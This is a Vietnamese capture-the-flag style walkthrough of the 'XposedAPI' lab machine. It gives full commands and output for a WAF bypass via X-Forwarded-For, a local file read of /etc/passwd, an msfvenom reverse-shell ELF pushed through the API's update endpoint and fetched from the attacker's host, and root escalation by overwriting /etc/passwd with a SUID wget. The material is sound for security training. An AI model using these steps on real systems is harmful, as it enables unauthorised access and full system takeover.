# XposedAPI

## Summary

Trong walkthrough này, khai thác mục tiêu bằng cách lạm dụng chức năng API trong ứng dụng web, cho phép tải lên và thực thi file binary độc hại. Sau đó, escalate bằng cách lạm dụng quyền SUID được cấu hình sai trên file binary `wget`, cho phép ghi đè file `/etc/passwd` nhạy cảm và đưa người dùng mới vào `root` group.

## Enumeration

### Nmap

Bắt đầu bằng cách quét `nmap`.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 192.168.120.149   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 07:10 EST
Nmap scan report for 192.168.120.149
Host is up (0.035s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
```

Quét ban đầu chỉ hiển thị dịch vụ SSH mở trên cổng 22. Tiếp theo, hãy quét tất cả các cổng TCP.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 192.168.120.149     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 07:04 EST
Nmap scan report for 192.168.120.149
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
13337/tcp open  unknown
```

Tìm thấy một dịch vụ khác trên cổng 13337. Hãy thử tìm hiểu thêm thông tin về dịch vụ này bằng cách chạy aggressive scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 13337 -A -T4 192.168.120.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 07:12 EST
Nmap scan report for 192.168.120.149
Host is up (0.029s latency).

PORT      STATE SERVICE VERSION
13337/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 (91%), Linux 4.15 - 5.6 (90%), Linux 5.0 (90%), Linux 2.6.32 (90%), Linux 2.6.32 or 3.10 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 3.7 (90%)
No exact OS matches for host (test conditions non-ideal).
```

Dịch vụ này có vẻ như dựa trên HTTP.

### HTTP Enumeration

Thử tương tác với dịch vụ này.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        
        
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        
        
        <div class="divmain">
            <h3>Usage:</h3>
            <div class="divmin">
                <p>/</p>
                <p>Methods: GET</p>
                <p>Returns this page.</p>
            </div>
            <div class="divmin">
                <p>/version</p>
                <p>Methods: GET</p>
                <p>Returns version of the app running.</p>
            </div>
            <div class="divmin">
                <p>/update</p>
                <p>Methods: POST</p>
                <p>Updates the app using a linux executable. Content-Type: application/json
                 {"user":"&lt;user requesting the update&gt;", "url":"&lt;url of the update to download&gt;"}
                 </p>
            </div>
            <div class="divmin">
                <p>/logs</p>
                <p>Methods: GET</p>
                <p>Read log files.</p>
            </div>
            <div class="divmin">
                <p>/restart</p>
                <p>Methods: GET</p>
                <p>To request the restart of the app.</p>
            </div>
    </body>
</html>
```

Có vẻ như đây là một API nhạy cảm đã bị expose và trang chủ có tài liệu hướng dẫn về API này. Theo hướng dẫn sử dụng, URL cập nhật có thể được truyền qua yêu cầu POST đến enpoint `/update` với dữ liệu JSON sau:

```
{"user":"<user requesting the update>", "url":"<url of the update to download>"}
```

Có vẻ như mục tiêu có thể tải xuống tệp thực thi Linux (ELF) để cập nhật và sau đó chạy tệp đó bằng cách sử dụng endpoint `/restart`. Một endpoint thú vị khác cần lưu ý là `/logs` có lệnh `Read log files`.

## Exploitation

Có vẻ như cần tên người dùng hợp lệ cho endpoint `/update`. Vì việc tấn công bằng brute-force có vẻ không khả thi, quay lại endpoint này sau.

### Bypassing WAF

Nếu thử truy cập endpoint `/logs` (http://192.168.120.149:13337/logs), thấy lỗi sau:

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/logs                                                 
WAF: Access Denied for this Host.
```

API dường như được "bảo vệ" bởi tường lửa ứng dụng web (WAF), từ chối quyền truy cập vào máy chủ. Tuy nhiên, nó dễ dàng bị đánh bại. Nhớ lại thông báo `It is just for management on localhost.` trên trang chủ của API, tất cả những gì phải làm là thêm header HTTP `X-Forwarded-For` và đặt thành `localhost` để bỏ qua hạn chế truy cập này.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/logs -H "X-Forwarded-For: localhost"
Error! No file specified. Use file=/path/to/log/file to access log files
```

Tuyệt! Đã bỏ qua WAF và hiện gặp phải lỗi mới dường như do chính ứng dụng tạo ra.

### Local File Inclusion Vulnerability

Lỗi quan sát được gợi ý về khả năng có lỗ hổng LFI. Kiểm tra điều này bằng cách thử truy cập tệp `/etc/passwd`.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost"
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        
        
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        
        
        <div class="divmain">
            <h3>Log:</h3>
            <div class="divmin">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

            </div>
        </div>
    </body>
</html>
```

Tuyệt! Ở cuối file, có thể thấy người dùng `clumsyadmin`. Hãy nhớ rằng cần một tên người dùng hợp lệ để tương tác với endpoint `/update`. Vì đây có vẻ là người dùng duy nhất trên hệ thống ngoài root, có thể thử cung cấp nó cho endpoint.

### Remote Code Execution

Thấy trong tài liệu API rằng nó mong đợi một tệp thực thi Linux ELF để áp dụng "update". Bắt đầu bằng cách tạo payload reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.118.5 LPORT=4444 -f elf -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
```

Có thể host nó qua HTTP với một máy chủ web python cơ bản.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Tiếp theo, upload reverse shell bằng cách gửi yêu cầu POST cần thiết đến endpoint `/update`.

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.120.149:13337/update -H "Content-Type: application/json" -H "X-Forwarded-For: localhost" --data '{"user":"clumsyadmin","url":"http://192.168.118.5/shell"}'
Update requested by clumsyadmin. Restart the software for changes to take effect.
```

Thấy một hit `200-OK` trên máy chủ web. Có vẻ như API đã tải xuống thành công payload.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.149 - - [12/Mar/2021 08:26:34] "GET /shell HTTP/1.1" 200 -
```

API hiện đang yêu cầu target đến endpoint `/restart` để bắt đầu khởi động lại dịch vụ. Hướng dẫn sử dụng cho biết yêu cầu này phải là GET. Trước tiên, thiết lập trình lắng nghe Netcat để bắt shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
```

Khi trình lắng nghe đã bắt đầu, gửi yêu cầu GET để khởi động lại dịch vụ. Thật không may, có vẻ như nó không hoạt động.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/restart -H "X-Forwarded-For: localhost"
<html>
    <head>
        <title>Remote Service Software Management API</title>
        <script>
            function restart(){
                if(confirm("Do you really want to restart the app?")){
                    var x = new XMLHttpRequest();
                    x.open("POST", document.URL.toString());
                    x.send('{"confirm":"true"}');
                    window.location.assign(window.location.origin.toString());
                }
            }
        </script>
    </head>
    <body>
    <script>restart()</script>
    </body>
</html>
```

Đọc source code, có vẻ như yêu cầu đến endpoint này thực sự phải là POST - không phải GET. 

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.120.149:13337/restart -H "X-Forwarded-For: localhost"
Restart Successful.
```

API đang báo cáo rằng dịch vụ đã được khởi động lại. Nếu bây giờ nhìn lại trình lắng nghe Netcat, đã nhận được reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.149: inverse host lookup failed: Unknown host
connect to [192.168.118.5] from (UNKNOWN) [192.168.120.149] 42202
python -c 'import pty; pty.spawn("/bin/bash")'
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ id
id
uid=1000(clumsyadmin) gid=1000(clumsyadmin) groups=1000(clumsyadmin)
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$
```

## Escalation

### SUID Enumeration

Bắt đầu liệt kê cục bộ bằng cách xem các tệp nhị phân có bit SUID được đặt.

```
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ find / -perm -u=s -type f 2>/dev/null
<admin/webapp$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/wget
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

Trong danh sách này, rất may mắn khi tìm thấy file binary `/usr/bin/wget`, file này sẽ giúp dễ dàng leo thang đặc quyền. Tùy chọn đầu ra `-O` của file binary sẽ cho phép ghi đè các tệp hệ thống nhạy cảm. Đối với một ví dụ đơn giản, có thể ghi đè file `/etc/passwd` và giới thiệu một người dùng mới trong `root` group.

Tạo một bản sao cục bộ của tệp trên máy tấn công.

```
┌──(kali㉿kali)-[~]
└─$ cat passwd  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```

Tiếp theo, sử dụng `openssl` để tạo một salted password hash theo định dạng `passwd` cho người dùng mới là `hacker` có mật khẩu `pass123` và thêm nó vào file local `passwd` như sau:

```
┌──(kali㉿kali)-[~]
└─$ openssl passwd -1 -salt hacker pass123
$1$hacker$zVnrpoW2JQO5YUrLmAs.o1

┌──(kali㉿kali)-[~]
└─$ echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash' >> passwd

┌──(kali㉿kali)-[~]
└─$ cat passwd                                                                       
root:x:0:0:root:/root:/bin/bash
...
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
```

Với máy chủ web python vẫn đang chạy trên cổng 80, tiếp tục và tải xuống file đã sửa đổi vào mục tiêu, ghi đè lên file `/etc/passwd` của mục tiêu.

```
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ wget http://192.168.118.5/passwd -O /etc/passwd
<pp$ wget http://192.168.118.5/passwd -O /etc/passwd
--2021-03-12 08:50:29--  http://192.168.118.5/passwd
Connecting to 192.168.118.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1462 (1.4K) [application/octet-stream]
Saving to: '/etc/passwd'

/etc/passwd         100%[===================>]   1.43K  --.-KB/s    in 0s      

2021-03-12 08:50:29 (224 MB/s) - '/etc/passwd' saved [1462/1462]
```

Bây giờ tất cả những gì cần làm là đăng nhập với tư cách là người dùng mới.

```
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ whoami
whoami
clumsyadmin
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ su hacker
su hacker
Password: pass123

root@xposedapi:/home/clumsyadmin/webapp# whoami
whoami
root
root@xposedapi:/home/clumsyadmin/webapp#
```